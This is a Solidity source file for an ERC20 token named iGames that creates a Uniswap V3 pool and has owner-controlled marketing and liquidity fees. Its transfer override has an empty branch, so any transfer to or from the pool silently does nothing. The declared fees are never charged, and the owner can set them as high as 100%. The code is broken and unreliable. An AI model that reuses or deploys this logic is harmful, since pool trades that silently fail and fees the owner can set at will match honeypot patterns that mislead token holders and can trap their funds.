// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@uniswap/v3-core/contracts/interfaces/IUniswapV3Factory.sol";
import "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "./library/Percentages.sol";

contract iGames is ERC20, Ownable {
    using Percentages for uint256;

    address public constant WETH9 = 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1;
    address public constant FACTORY = 0x1F98431c8aD98523631AE4a59f267346ea31F984;

    address public constant MARKETING = 0xebdeA78F37588752AFED1681C8E068F23CFEc010;
    address public constant LP = 0xCCF5B6C077996ba12f63b283c5c8335ADCdfEe66;

    address public immutable _uniswapV3Pool;

    uint16 public _marketingFee = 60;
    uint16 public _lpFee = 330;

    mapping (address => bool) private _excludedFee;

    modifier percentage(uint16 val) {
        require(val <= 10000, "out of limit");
        _;
    }

    constructor() ERC20("iGames", "IGS") {
        address thisAddr = address(this);
        _mint(thisAddr, 840000 * 10 ** 18);

        _uniswapV3Pool = IUniswapV3Factory(FACTORY).createPool(WETH9, thisAddr, 3000);
        IUniswapV3Pool(_uniswapV3Pool).initialize(1000);

        _excludedFee[thisAddr] = true;
        _excludedFee[MARKETING] = true;
        _excludedFee[LP] = true;
        _excludedFee[msg.sender] = true;
    }

    function setLPFee(uint16 lpFee) external onlyOwner percentage(lpFee) {
        _lpFee = lpFee;
    }

    function setMarketingFee(uint16 marketingFee) external onlyOwner percentage(marketingFee) {
        _marketingFee = marketingFee;
    }

    function addExcludedFee(address addr_) external onlyOwner {
        require(address(0) != addr_, "ExcludedFee: address is zero");
        _excludedFee[addr_] = true;
    }

    function removeExcludedFee(address addr_) external onlyOwner {
        require(address(0) != addr_, "ExcludedFee: address is zero");
        _excludedFee[addr_] = false;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        if (from != _uniswapV3Pool && to != _uniswapV3Pool) {
            super._transfer(from, to, amount);
            return;    
        }

        
    }

    function _transferOwnership(address newOwner) internal override {
        super._transferOwnership(newOwner);
        _excludedFee[msg.sender] = false;
        _excludedFee[newOwner] = true;
    }
}